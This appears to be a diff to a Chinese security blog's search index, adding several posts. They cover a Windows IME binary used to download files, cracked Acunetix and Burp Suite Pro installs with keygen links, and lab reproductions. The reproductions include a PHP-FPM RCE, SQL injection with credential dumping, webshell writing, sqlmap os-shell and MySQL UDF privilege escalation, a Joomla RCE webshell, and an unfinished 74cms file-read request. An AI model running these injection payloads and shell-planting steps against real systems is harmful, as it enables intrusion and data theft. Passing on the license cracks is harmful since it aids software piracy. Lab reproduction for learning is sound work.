@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>IMEWDBLD.EXE文件下载</title>
+      <link href="/archives/36686/"/>
+      <url>/archives/36686/</url>
+      
+        <content type="html"><![CDATA[<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p><a href="https://twitter.com/notwhickey/status/1367493406835040265">https://twitter.com/notwhickey/status/1367493406835040265</a></p><p><img src="https://i.loli.net/2021/07/07/I2lqOLXGor5xyWe.png"></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE 为Windows自带程序，描述为Microsoft IME Open Extended Dictionary Module，直译为微软输入法编辑器打开扩展词典模块。该模块可用于下载文件。</p><p><img src="https://i.loli.net/2021/07/07/x8U1poJnfgZadqQ.png"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h5 id="启用HTTP服务"><a href="#启用HTTP服务" class="headerlink" title="启用HTTP服务"></a>启用HTTP服务</h5><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python -m http.server <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/07/UZGjTX8Ll5vsoCE.png"></p><h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">C:\Windows\System32\IME\SHARED\IMEWDBLD<span class="token punctuation">.</span>EXE http:<span class="token operator">/</span><span class="token operator">/</span>127<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>1<span class="token operator">/</span>test<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/07/c97NaGmXn5K4tFI.png"></p><p>运行后会报错，但实则文件已在下载</p><h5 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h5><p>下载后的文件存储在%LocalAppData%\Microsoft\Windows\INetCache&lt;8位随机数字字母&gt;/&lt;文件名&gt;[1].&lt;后缀名&gt;</p><p>该目录为隐藏目录，文件资源管理器无法查看，使用forfiles查找文件</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">forfiles <span class="token operator">/</span>P <span class="token string">"%localappdata%\Microsoft\Windows\INetCache\IE"</span> <span class="token operator">/</span>S <span class="token operator">/</span>M <span class="token operator">*</span> <span class="token operator">/</span>C <span class="token string">"cmd /c echo @path"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/07/asept2zdc1Co9AB.png"></p><p>forfiles参数说明</p><table><thead><tr><th align="left">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">/P <code>&lt;pathname&gt;</code></td><td align="left">指定从其开始搜索的路径。 默认情况下，搜索从当前工作目录开始。</td></tr><tr><td align="left">/M<code>&lt;searchmask&gt;</code></td><td align="left">根据指定的搜索掩码搜索文件。 默认的 searchmask 为 <code>*</code> 。</td></tr><tr><td align="left">/S</td><td align="left">指示 <strong>forfiles</strong> 命令以递归方式搜索子目录。</td></tr><tr><td align="left">/C <code>&lt;command&gt;</code></td><td align="left">对每个文件运行指定的命令。 命令字符串应以双引号括起来。 默认命令为 <code>&quot;cmd /c echo @file&quot;</code> 。</td></tr><tr><td align="left">@PATH</td><td align="left">文件的完整路径。</td></tr></tbody></table><p>详见<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/forfiles">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/forfiles</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Windows </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CVE-2020-0796 RCE和LPE</title>
       <link href="/archives/57083/"/>
       <url>/archives/57083/</url>
@@ -131,6 +156,158 @@
     
     
     <entry>
+      <title>acunetix_13.0.200205121安装与破解</title>
+      <link href="/archives/41a0b815/"/>
+      <url>/archives/41a0b815/</url>
+      
+        <content type="html"><![CDATA[<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="/misc/">acunetix_13.0.200205121.zip</a></p><p>包含acunetix_13.0.200205121.exe，license_info.json，wvsc.exe以及安装说明.txt</p><p>SHA1：DEDF04A16B6A61174072A2DE5372DBB2CCD045B9</p><p>MD5：7F6A60A04C8D936E49690C43EA1C93CE</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>运行acunetix_13.0.200205121.exe安装awvs13</p><p><img src="https://i.loli.net/2020/02/18/ROPVMuGzKTyr1Aj.png"></p><p>复制wvsc.exe到“C:\Program Files (x86)\Acunetix\13.0.200205121\”下覆盖同名文件（如果安装时修改了安装路径，请更改为修改后的路径）</p><p><img src="https://i.loli.net/2020/02/18/v5C4ekYT7638ynJ.png"></p><p>复制license_info.json到“C:\ProgramData\Acunetix\shared\license”下覆盖同名文件</p><p><img src="https://i.loli.net/2020/02/18/rgvB9Z81dOKuPTC.png"></p><p>如果没有C:\ProgramData目录，请打开显示隐藏项目</p><p><img src="https://i.loli.net/2020/02/18/WLOXEoyiCmYTRqn.png"></p><p>可禁用Acunetix和Acunetix Database这两个服务，让awvs不开机自启，想使用是再启用即可（win10可直接在任务管理器启动服务）</p><p><img src="https://i.loli.net/2020/02/18/p95nrJmPxh1ikuF.png"></p><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><p><img src="https://i.loli.net/2020/02/18/wNFGX71nSlILhT9.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 资源分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Burp Suite v2020.9.2的汉化以及无cmd框启动</title>
+      <link href="/archives/38a7a949/"/>
+      <url>/archives/38a7a949/</url>
+      
+        <content type="html"><![CDATA[<h2 id="更新日志"><a href="#更新日志" class="headerlink" title="更新日志"></a>更新日志</h2><h2 id="主要更新日志"><a href="#主要更新日志" class="headerlink" title="主要更新日志"></a>主要更新日志</h2><p>V2020.9.2（2020.10.02）</p><p>Burp Scanner支持处理更复杂的登录过程，可配合<a href="https://chrome.google.com/webstore/detail/burp-suite-navigation-rec/anpapjclbjicacakeoggghfldppbkepg">Burp Suite Navigation Recorder</a>浏览器插件录制复杂的登录过程</p><p>Burp Collaborator客户端支持清除交互历史</p><p>修复目标主机名包含下划线时，TLS握手失败的问题；粘贴HTTP请求时，所有内容都可正确显示；解决了Collaborator服务器中的一个安全问题</p><p>V2020.9.1（2020.09.04）</p><p>修复 WebSocket 信息无法正常显示的问题</p><p>V2020.9（2020.09.03）</p><p>对HTTP编辑器界面进行了优化，增加了三个布局，如下图</p><p><img src="https://i.loli.net/2020/09/04/3ATm68r9ligNIbX.jpg"></p><p>内置浏览器更新至Chromium 85.0.4183.83，已更新对应翻译</p><p>V2020.8（2020.08.06）</p><p>新增对网页缓存中毒扫描检查，以及其他一些小的改进和错误修复</p><p>V2020.7（2020.07.20）</p><p>内置chromium浏览器，可直接使用内置浏览器抓包，已更新部分翻译</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>BurpSuite2.0.11beta后的的破解版方法来源于四叔</p><p><a href="http://scz.617.cn:8/misc/201910151519.txt">http://scz.617.cn:8/misc/201910151519.txt</a></p><p><a href="https://www.52pojie.cn/thread-1038295-1-1.html">https://www.52pojie.cn/thread-1038295-1-1.html</a></p><p>四叔已经不在破解后续版本了</p><blockquote><p>2020-04-28 17:23</p><p>有人提供了Burp Pro 2020.4原包，要求最低Java 9，不再支持Java 8。实际测试<br>Java 8确实不行，去官网看了一下说明，官方声明也是这个意思。出于好奇心，最后<br>看了一次其注册机制，没啥变化，可剁。我主要使用Java 8，并非Burp用户，能在这<br>半年来坚持更新破解，算是为大伙儿尽一点小小的心意。本来，如果它还支持Java 8，<br>我就继续剁下去。不想为这事再装Java 9，确实累了，另一方面也对之失去兴趣，没<br>有挑战性。据我所知，很多人延着我的思路在自己剁，也剁成功了。或许你们可以等<br>待新的雷锋，冥冥中另一些路见不平的老中医已经在路上。</p><p>正式决定不再从事Burp破解，微信订阅号后台也不再接受Burp原包。今天有ID为火锅<br>爹、Mannix的两位在微信订阅号后台提供了2020.4版原包，感谢并抱歉，未能最后一<br>次提供传说中的burp-loader-keygen-2020_4.jar。</p><p>感谢过往所有在微信订阅号后台提供过原包的朋友，再次向所有”永远充满好奇心的<br>人们”致敬。</p><p>今天是一个有些伤感的日子，但不再留恋，再见。</p></blockquote><p>后续版本的破解来源于</p><p><a href="https://github.com/x-Ai/BurpSuiteLoader">https://github.com/x-Ai/BurpSuiteLoader</a></p><p>需要 java 9-14  <a href="https://www.oracle.com/java/technologies/javase-jdk14-downloads.html">java14下载</a></p><p>支持 BurpSuite v2020.1及以后的所有版本（只要注册机制不改变）</p><p>以下是我打包的版本（包括<a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk-11.0.8-windows-x64</a>，<a href="http://www.mediafire.com/file/j5y1olh5yp7bf3a/burpsuite_pro_v2020.9.2.jar/file">原版jar</a>，<a href="https://github.com/x-Ai/BurpSuiteLoader">BurpSuiteLoader</a>，图标，<a href="https://github.com/hackxx/BurpSuiteCn">汉化包</a>及翻译文件，启动的vbs，<a href="https://www.jython.org/">jython</a>，<a href="https://github.com/TheKingOfDuck/burpFakeIP">fakeIP</a>，<a href="https://github.com/pmiaowu/BurpShiroPassiveScan">BurpShiroPassiveScan</a>，<a href="https://github.com/bit4woo/knife">knife</a>等插件）</p><p><a href="https://pan.baidu.com/s/1y_ndlZF2oGPUheQDnxUbeA">Burp_Suite_Pro_v2020.9.2.zip</a>  提取码: miku</p><table><thead><tr><th align="left">算法</th><th>哈希值</th></tr></thead><tbody><tr><td align="left">SHA256</td><td>339F3A3677D031EC3061B3C55B08154DCB952CE8DA99E7EF264E3F3021CB6EEE</td></tr><tr><td align="left">MD5</td><td>37954D3204791937ADF234E05F16ACAD</td></tr></tbody></table><p>burpsuite_pro_v2020.9.2.jar（来自nszy007）</p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>E208E249635AFCD25FCD86F732C818751D859EAABA8371FF5B98A862A6389A20</td></tr><tr><td>MD5</td><td>CB8DA0399DAE59F32E7E54292C851FF9</td></tr></tbody></table><p><a href="https://portswigger.net/burp/releases">官网</a></p><p><img src="https://i.loli.net/2020/10/09/oZDIae29inxz63L.png"></p><p>第一次破解启动需要使用burp-loader-keygen-2020_2_1.jar完成注册流程</p><p><a href="http://scz.617.cn/private/burp-loader-keygen-2020_2_1.jar_568321911fea077bc290bd9914b73402">burp-loader-keygen-2020_2_1.jar</a></p><table><thead><tr><th>算法</th><th>哈希值</th></tr></thead><tbody><tr><td>SHA256</td><td>74893842A782238F52F0F225C06FA744568321911FEA077BC290BD9914B73402</td></tr><tr><td>MD5</td><td>E646B3EEF03EFBA637E6ED794CED4114</td></tr></tbody></table><p>原版启动的bat为</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">java -noverify -javaagent:BurpSuiteLoader.jar -jar burpsuite_pro_v2020.9.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>加载汉化包即可汉化</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">java -noverify -javaagent:BurpSuiteLoader.jar -Dfile.encoding&#x3D;utf-8 -javaagent:BurpSuiteChs.jar -jar burpsuite_pro_v2020.9.2.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="无cmd框启动"><a href="#无cmd框启动" class="headerlink" title="无cmd框启动"></a>无cmd框启动</h2><p>使用vbs脚本即可</p><pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">CreateObject(&quot;WScript.Shell&quot;).Run &quot;.\jdk-11.0.8&#x2F;bin&#x2F;java.exe -noverify -javaagent:BurpSuiteLoader.jar -javaagent:BurpSuiteCn.jar -Dfile.encoding&#x3D;utf-8 -jar burpsuite_pro_v2020.9.2.jar&quot;,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="创建桌面图标"><a href="#创建桌面图标" class="headerlink" title="创建桌面图标"></a>创建桌面图标</h2><p>桌面右键，新建快捷方式，指定vbs脚本，然后更改图标即可</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p>桌面图标</p><p><img src="https://i.loli.net/2019/12/02/dpcsBjo9NyPVnLO.png"></p><p>最终效果</p><p><img src="https://i.loli.net/2020/10/09/RT4hotsKQqabCXI.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 资源分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 资源分享 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CVE-2019-11043复现</title>
+      <link href="/archives/78f531e0/"/>
+      <url>/archives/78f531e0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。</p><p>在长亭科技举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现，向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。</p><p>在使用一些有错误的Nginx配置的情况下，通过恶意构造的数据包，即可让PHP-FPM执行任意代码。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里直接使用p牛的docker环境进行复现</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">PHP-FPM 远程代码执行漏洞（CVE-2019-11043）</a></p><h6 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> docker docker-compose <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="启动docker"><a href="#启动docker" class="headerlink" title="启动docker"></a>启动docker</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start docker<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/vulhub/vulhub.git<span class="token builtin class-name">cd</span> vulhub/php/CVE-2019-11043docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在启动环境前建议先设置镜像加速</p><p>在 /etc/docker/daemon.json 写入以下内容（如果不存在文件，请新建）</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"registry-mirrors"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"https://registry.docker-cn.com"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以上是添加 docker 官方提供的中国镜像，也可以选择使用阿里云，中科大等镜像。添加镜像后需要重启docker</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> systemctl daemon-reload<span class="token function">sudo</span> systemctl restart docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/jR5z9rEof6Jvsgh.png"></p><p>看到上面的界面代表环境启动成功，默认页面在<a href="http://127.0.0.1:8080/index.php">http://127.0.0.1:8080/index.php</a></p><p><img src="https://i.loli.net/2019/10/29/YTiLtIS8RGwcuzP.png"></p><h6 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p>安装golang，git代码并编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> golang<span class="token function">git</span> clone https://github.com/neex/phuip-fpizdam.git<span class="token builtin class-name">cd</span> phuip-fpizdamgo get -vgo build<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/q1FviSD6Jn2mLfj.png"></p><p>运行</p><pre class="line-numbers language-none"><code class="language-none">go run . &quot;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;index.php&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/29/TFlHUvW5hXAfCrB.png"></p><p>验证</p><p><img src="https://i.loli.net/2019/10/29/DsackPLWy9COMoE.png"></p><p>因为php-fpm会启动多个子进程，在访问<code>/index.php?a=id</code>时需要多访问几次，以访问到被污染的进程 </p><p>复现完后建议删除或停止容器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">docker <span class="token function">ps</span> //查看正在运行容器 docker stop containerId //containerId是容器的ID docker <span class="token function">ps</span> -a //查看所有容器 docker <span class="token function">ps</span> -a -q //查看所有容器ID docker stop <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -a -q<span class="token variable">)</span></span> //停止所有容器 docker <span class="token function">rm</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -a -q<span class="token variable">)</span></span> //删除所有容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>SQL注入以及UDF提权</title>
+      <link href="/archives/27651eb5/"/>
+      <url>/archives/27651eb5/</url>
+      
+        <content type="html"><![CDATA[<p><strong>熊海CMS的SQL注入以及后续的UDF提权</strong><span id="more"></span></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>后台登录界面存在sql注入，可抓包后放到sqlmap跑<img src="https://i.loli.net/2019/10/28/EQmeRBvlMpLbo9a.png"></p><p>可获取到管理员密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r <span class="token number">1</span>.txt -D isea -T manage -C name,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/OcJSzXi1tBlGWf9.png"></p><p>登陆到后台后还存在union联合注入</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,9,10--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/JpGQmZsozfcMS4j.png"></p><p>构造注入语句</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,version(),user(),@@datadir,5,database(),7,password,9,10 from manage--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/afdbNP5roHG7jwU.png"></p><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>通过sqlmap读取配置文件获取网站绝对路径</p><pre class="line-numbers language-http" data-language="http"><code class="language-http">sqlmap -r 1.txt --file-read /etc/httpd/conf/httpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/kiuISv2Kxoc9Mnr.png"></p><p>也可构造load_file()读取文件</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,load_file('/etc/httpd/conf/httpd.conf'),9,10--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/UQXgjxoNWD14e8f.png"></p><h6 id="获取到绝对路径后可以使用sqlmap获取os-shell"><a href="#获取到绝对路径后可以使用sqlmap获取os-shell" class="headerlink" title="获取到绝对路径后可以使用sqlmap获取os-shell"></a>获取到绝对路径后可以使用sqlmap获取os-shell</h6><p>PS:获取到绝对路径后并没根目录的权限，但子目录有权限</p><p><img src="https://i.loli.net/2019/10/28/VhPavUCYJzTDp1O.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r <span class="token number">1</span>.txt --os-shell     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/KjVMJHvdeyq13Fz.png"></p><p>输入网站类型和路径，即可获取os-shell</p><p><img src="https://i.loli.net/2019/10/28/WAbHmzN1dcyGYwa.png"></p><p>sqlmap会上传两个页面，前者为文件上传，后者为命令执行执行</p><p><img src="https://i.loli.net/2019/10/28/YfMyDHwOKrIG4Z3.png" alt="前者"></p><p><img src="https://i.loli.net/2019/10/28/IQHG2kfqnND18Wm.png" alt="后者"></p><p>可以利用文件上传页面上传其他shell，获得更好的体验</p><h6 id="或者构造into-outfile写shell"><a href="#或者构造into-outfile写shell" class="headerlink" title="或者构造into outfile写shell"></a>或者构造into outfile写shell</h6><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//10.1.1.11/admin/?r=editcolumn&amp;type=1&amp;id=1' and 1=2 union select 1,2,3,4,5,6,7,8,'&lt;?php phpinfo();?>',10 into outfile '/var/www/html/xcxmiku/images/xcx.php'--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/4MOEnLU1o28DNZB.png"></p><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><p>此时shell的权限为 apache <img src="https://i.loli.net/2019/10/28/sNPFq6QWzpvMykT.png"></p><p>使用UDF提权可将将MYSQL账号root转化为系统system权限，从而执行系统任意命令 </p><h6 id="UDF获取"><a href="#UDF获取" class="headerlink" title="UDF获取"></a>UDF获取</h6><p>在msf的/usr/share/metasploit-framework/data/exploits/mysql目录下</p><p><img src="https://i.loli.net/2019/10/28/wJteD3chuvo2mYC.png"></p><p>也可在<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">github</a>上获取</p><p>dll对应Windows，so对应Linux</p><p>使用sqlmap –sql-shell 获取 mysql root密码</p><p>5.6及以下版本执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select host,user,password from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5.7及以上版本执行</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select host,user,authentication_string from mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/Bik34rAhfHEOuTw.png"></p><p>我这里为空密码</p><p>使用蚁剑连接数据库获取必要信息</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select @@version_compile_machine,@@plugin_dir;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/upzlc9hDC1bw5UV.png"></p><p>操作系统为64位，Plugin文件夹 在/usr/lib64/mysql/plugin</p><h6 id="UDF上传"><a href="#UDF上传" class="headerlink" title="UDF上传"></a>UDF上传</h6><p>使用蚁剑将 lib_mysqludf_sys_64.so 上传至 /usr/lib64/mysql/plugin</p><p><img src="https://i.loli.net/2019/10/28/qpBoUnaY63bMg5L.png"></p><p>安装UDF</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">create function sys_eval returns string soname &#39;lib_mysqludf_sys_64.so&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/ea6oKxGQXcYlkb1.png"></p><p>这里我们选择sys_eval函数，此函数可执行系统命令并回显</p><p>验证</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from mysql.func where name &#x3D; &#39;sys_eval&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/E2xOmUy1vaWu3VY.png"></p><p>利用</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select sys_eval(&#39;whoami&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/28/XKLWDGoQNv9EH5a.png"></p><p>通过sys_eval即可执行任意系统命令</p><p>PS: 记得用完删除文件和udf定义，删除语句为drop function sys_eval;</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> sql注入 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Joomla3.4.6-RCE漏洞复现</title>
+      <link href="/archives/604d2f58/"/>
+      <url>/archives/604d2f58/</url>
+      
+        <content type="html"><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>源码下载地址</p><p><a href="https://github.com/joomla/joomla-cms/releases/tag/3.4.6">https://github.com/joomla/joomla-cms/releases/tag/3.4.6</a><br><a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a> </p><p> 我这边直接使用了phpstudy</p><p><img src="https://i.loli.net/2019/10/23/Kmkp3qgMayu6rZf.png"> </p><p><img src="https://i.loli.net/2019/10/23/gcO72WNJht5eRBT.png"></p><p>这里需要提前新建数据库，然后直接安装即可。</p><p><img src="https://i.loli.net/2019/10/23/C9WxVTsIi7Pjop3.png"></p><p> 安装完成后的默认后台地址为</p><p><a href="http://127.0.0.1/joomla/administrator/">http://127.0.0.1/joomla/administrator/</a></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h3><p>POC在这里</p><p><a href="https://github.com/kiks7/rusty_joomla_rce">https://github.com/kiks7/rusty_joomla_rce</a></p><h6 id="使用python进行漏洞检测"><a href="#使用python进行漏洞检测" class="headerlink" title="使用python进行漏洞检测"></a>使用python进行漏洞检测</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python rusty_joomla_exploit.py -t http://10.1.1.11/joomla/ -c   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/10/23/tOe7n5WLQy8UP6i.png"></p><h6 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h6><p><img src="https://i.loli.net/2019/10/23/HXMYL6n7WOueD5A.png"></p><p>反弹shell失败，但是在 configuration.php 写入了一句话木马，使用蚁剑连接</p><p><img src="https://i.loli.net/2019/10/23/Ns2j8I1Rbh4SAdT.png"></p><p>可getshell</p><h6 id="使用msf进行漏洞检测"><a href="#使用msf进行漏洞检测" class="headerlink" title="使用msf进行漏洞检测"></a>使用msf进行漏洞检测</h6><p>将metasploit_rusty_joomla_rce放到/usr/share/metasploit-framework/modules/exploits/multi/php/</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> metasploit_rusty_joomla_rce.rb /usr/share/metasploit-framework/modules/exploits/multi/php/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后在 msfconsole 里 reload_all 再搜索 joomla </p><p><img src="https://i.loli.net/2019/10/23/5OosHyXm6iJVrkw.png"></p><p>选择模块并查看参数</p><p><img src="https://i.loli.net/2019/10/23/Kd4JqNcDm9fY1jM.png"></p><p>设置参数进行攻击</p><p><img src="https://i.loli.net/2019/10/23/KwhXSxFQZukpLGO.png"></p><p>还需设set verbose true</p><p><img src="https://i.loli.net/2019/10/23/m8uAOQiI9sYyLWN.png"></p><p>能获取到漏洞所需要的信息，但却还是利用失败，原因未知。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术分享 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>74cms v4.2.3任意文件读取</title>
+      <link href="/archives/b5945507/"/>
+      <url>/archives/b5945507/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关于漏洞的分析请看这篇文章<a href="https://balis0ng.com/post/dai-ma-shen-ji/2017-07-05">74cms v4.2.3前台任意文件读取</a>，大佬分析的很详细，我这里不作分析，仅复现漏洞。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>先尝试读取 db.php，向服务器post如下数据</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/index.php?m=&amp;c=members&amp;a=register</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> 10.1.1.1<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 <span class="token header-name 